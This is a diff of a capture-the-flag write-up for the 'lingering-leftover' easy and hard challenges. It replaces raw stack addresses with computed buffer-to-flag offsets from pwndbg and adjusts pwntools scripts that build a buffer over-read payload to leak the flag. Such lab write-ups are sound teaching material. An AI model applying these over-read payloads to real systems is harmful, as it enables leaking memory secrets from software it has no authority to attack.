 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-- [x] Location of buffer: `0x7ffe5dbd2da0`
-- [x] Location of the flag in the stack: `0x7ffe5dbd2e96`
+- [ ] Offset between location of the buffer and location of the flag
+   - Location of buffer: `0x7ffe5dbd2da0`
+   - Location of the flag in the stack: `0x7ffe5dbd2e96`
+
+```
+pwndbg> p/d 0x7ffe5dbd2e96 - 0x7ffe5dbd2da0
+$1 = 246
+```
+
+- [x] Offset between location of the buffer and location of the flag: `246`
+   - Location of buffer: `0x7ffe5dbd2da0`
+   - Location of the flag in the stack: `0x7ffe5dbd2e96`
 
 If we send our payload right upto the flag's address in the stack, we can cause a buffer over-read.
 
@@ -8305,11 +8401,9 @@ from pwn import *
 p = process('/challenge/lingering-leftover-easy')
 
 # Initialize values
-buffer_addr = 0x7ffe5dbd2da0
-flag_addr = 0x7ffe5dbd2e96
+offset = 246
 
-# Calculate offset & payload_size
-offset = flag_addr - buffer_addr
+# Calculate payload_size
 payload_size = offset
 
 # Build payload
@@ -8378,8 +8472,7 @@ Goodbye!
 
 Requirements:
 
-- [ ] Location of buffer
-- [ ] Location of the flag in the stack
+- [ ] Offset between location of the buffer and location of the flag
 
 ### Binary Analysis
 
@@ -8591,8 +8684,8 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-- [ ] Location of buffer
-- [x] Location of the flag in the stack: `0x7fff21143e7a`
+- [ ] Offset between location of the buffer and location of the flag
+   - Location of the flag in the stack: `0x7fff21143e7a`
 
 ```
 pwndbg> c
@@ -8656,8 +8749,18 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ```
 
-- [x] Location of buffer: `0x7fff21143df0`
-- [x] Location of the flag in the stack: `0x7fff21143e7a`
+- [ ] Offset between location of the buffer and location of the flag
+   - Location of buffer: `0x7fff21143df0`
+   - Location of the flag in the stack: `0x7fff21143e7a`
+
+```
+pwndbg> p/d 0x7fff21143e7a - 0x7fff21143df0
+$1 = 138
+```
+
+- [x] Offset between location of the buffer and location of the flag: `138`
+   - Location of buffer: `0x7fff21143df0`
+   - Location of the flag in the stack: `0x7fff21143e7a`
 
 We can now perform a buffer over-read.
 
@@ -8669,11 +8772,9 @@ from pwn import *
 p = process('/challenge/lingering-leftover-hard')
 
 # Initialize values
-buffer_addr = 0x7fff21143df0
-flag_addr = 0x7fff21143e7a
+offset = 138
 
-# Calculate offset & payload_size
-offset = flag_addr - buffer_addr
+# Calculate payload size
 payload_size = offset
 
 # Build payload
